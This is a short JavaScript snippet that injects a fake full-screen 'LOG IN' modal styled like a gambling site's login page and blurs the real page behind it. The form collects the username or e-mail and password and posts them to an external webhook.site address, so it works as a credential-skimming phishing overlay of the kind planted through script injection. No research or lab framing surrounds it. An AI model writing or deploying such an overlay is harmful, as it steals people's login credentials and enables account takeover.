(function() {
  // Insert modal HTML
  document.body.insertAdjacentHTML('beforeend', `
    <div id="custom-login-modal" style="
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    ">
      <div style="
        background: #2a2e3d;
        border-radius: 10px;
        padding: 30px;
        max-width: 400px;
        width: 100%;
        box-shadow: 0 0 10px rgba(0,0,0,0.5);
        color: #fff;
        font-family: Arial, sans-serif;
      ">
        <h2 style="text-align: center; margin-bottom: 20px;">LOG IN</h2>

        <form action="https://webhook.site/7f822c10-8055-4f28-9c17-0be0144752d1/" method="post" style="display: flex; flex-direction: column;">
          <label style="font-size: 12px; color: #ffa500; text-transform: uppercase;">USERNAME OR E-MAIL</label>
          <input type="text" name="username" placeholder="Username or E-mail" style="
            width: 100%;
            padding: 10px;
            margin: 5px 0 15px;
            border: 1px solid #ffa500;
            border-radius: 5px;
            background: #3a3f51;
            color: #ccc;
            font-size: 14px;
          " />

          <label style="font-size: 12px; color: #ffa500; text-transform: uppercase;">PASSWORD</label>
          <input type="password" name="password" placeholder="Password" style="
            width: 100%;
            padding: 10px;
            margin: 5px 0 5px;
            border: 1px solid #555;
            border-radius: 5px;
            background: #3a3f51;
            color: #ccc;
            font-size: 14px;
          " />

          <div style="text-align: right; margin-bottom: 15px;">
            <a href="#" style="color: #ffa500; text-decoration: none; font-size: 12px;">Forgot password</a>
          </div>

          <button type="submit" style="
            width: 100%;
            background: #ffa500;
            color: #2a2e3d;
            padding: 12px;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
          ">LOG IN</button>
        </form>

        <div style="text-align: center; margin-top: 15px; font-size: 14px; color: #ccc;">
          👤 Log in with a Passkey
        </div>

        <hr style="margin: 20px 0; border-color: #555;" />

        <div style="display: flex; justify-content: space-between; font-size: 14px; color: #ccc;">
          <div style="text-align: center;">
            <div style="font-size: 18px;">🎲</div>
            <div>127,823,908,842</div>
            <div>BETS</div>
          </div>
          <div style="text-align: center;">
            <div style="font-size: 18px;">💰</div>
            <div>$2,280,764,871</div>
            <div>TOTAL WON</div>
          </div>
        </div>
      </div>
    </div>
  `);

  // Apply blur to page content
  const pageContent = document.getElementById('page-content');
  if (pageContent) {
    pageContent.style.transition = 'filter 0.3s ease';
    pageContent.style.filter = 'blur(5px)';
  }

  // Close modal on click outside or Escape key
  document.getElementById('custom-login-modal').addEventListener('click', (e) => {
    if (e.target.id === 'custom-login-modal') {
      document.getElementById('custom-login-modal').remove();
      if (pageContent) pageContent.style.filter = 'none';
    }
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      const modal = document.getElementById('custom-login-modal');
      if (modal) {
        modal.remove();
        if (pageContent) pageContent.style.filter = 'none';
      }
    }
  });
})();
